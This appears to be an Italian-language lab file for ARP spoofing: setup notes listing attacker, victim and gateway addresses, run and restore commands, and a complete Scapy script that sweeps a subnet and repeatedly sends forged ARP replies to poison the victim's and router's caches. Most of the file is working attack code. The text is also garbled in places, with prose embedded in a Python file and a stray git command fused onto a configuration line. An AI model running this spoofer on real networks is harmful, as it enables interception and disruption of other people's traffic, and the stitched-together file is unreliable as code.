#!/usr/bin/env python3

🧠 Dati finali per lo spoofing
Nodo	     IP	         MAC	            Interfaccia
Attaccante	10.0.2.16	00:11:22:33:44:55	     eth0
Vittima	    10.0.2.15	08:00:27:55:44:07	    enp0s3
Gateway	    10.0.2.2	52:54:00:12:35:02	    enp0s3

🔧 Modifica arp_spoof_lab.py
Nel tuo script, imposta:

victim_ip = "10.0.2.15"git push -u origin main

victim_mac = "08:00:27:55:44:07"
router_ip = "10.0.2.2"
router_mac = "52:54:00:12:35:02"
attacker_mac = "00:11:22:33:44:55"

#Assicurati che l’interfaccia usata sia eth0.

🔥 Esecuzione dell’attacco
Sulla VM attaccante:


cd ~/arp_lab/scripts/
sudo python3 arp_spoof_lab.py


🧪 Verifica sulla VM vittima

ping 8.8.8.8

#Se il ping fallisce durante lo spoofing, l’attacco è riuscito.

🛡️ Ripristino
Sulla VM attaccante:

sudo sysctl -w net.ipv4.ip_forward=0

Sulla VM vittima:

sudo ip neigh flush all



from scapy.all import ARP, Ether, send, srp
import time
import signal
import sys

# === CONFIGURAZIONE ===
victim_ip    = "10.0.2.15"
victim_mac   = "08:00:27:55:44:07"
router_ip    = "10.0.2.2"
router_mac   = "52:54:00:12:35:02"
attacker_mac = "00:11:22:33:44:55"
interface    = "eth0"
network_range = "10.0.2.0/24"

# === LOG ===
log_file = "../logs/arp_lab.log"

def log(msg):
    timestamp = time.strftime("[%Y-%m-%d %H:%M:%S]")
    with open(log_file, "a") as f:
        f.write(f"{timestamp} {msg}\n")
    print(f"{timestamp} {msg}")

# === 1. SWEEP ARP ===
def arp_sweep():
    log(f"Avvio sweep su {network_range} tramite {interface}")
    arp = ARP(pdst=network_range)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether / arp
    result = srp(packet, timeout=2, iface=interface, verbose=False)[0]
    for _, received in result:
        log(f"Host attivo: {received.psrc} → {received.hwsrc}")

# === 2. SPOOFING ARP ===
def spoof():
    # Vittima crede che l'attaccante sia il router
    pkt1 = ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=router_ip, hwsrc=attacker_mac)
    # Router crede che l'attaccante sia la vittima
    pkt2 = ARP(op=2, pdst=router_ip, hwdst=router_mac, psrc=victim_ip, hwsrc=attacker_mac)
    send(pkt1, verbose=False)
    send(pkt2, verbose=False)
    log("Pacchetti ARP spoof inviati")

# === 3. RIPRISTINO ARP ===
def restore():
    log("Ripristino tabelle ARP...")
    pkt1 = ARP(op=2, pdst=router_ip, hwdst=router_mac, psrc=victim_ip, hwsrc=victim_mac)
    pkt2 = ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=router_ip, hwsrc=router_mac)
    send(pkt1, count=3, verbose=False)
    send(pkt2, count=3, verbose=False)
    log("ARP ripristinato correttamente")

# === GESTIONE CTRL+C ===
def signal_handler(sig, frame):
    log("Intercettato Ctrl+C — eseguo ripristino")
    restore()
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

# === ESECUZIONE ===
if __name__ == "__main__":
    log("=== INIZIO LAB ARP ===")
    arp_sweep()
    log("Avvio spoofing ARP (Ctrl+C per terminare)")
    while True:
        spoof()
        time.sleep(2)
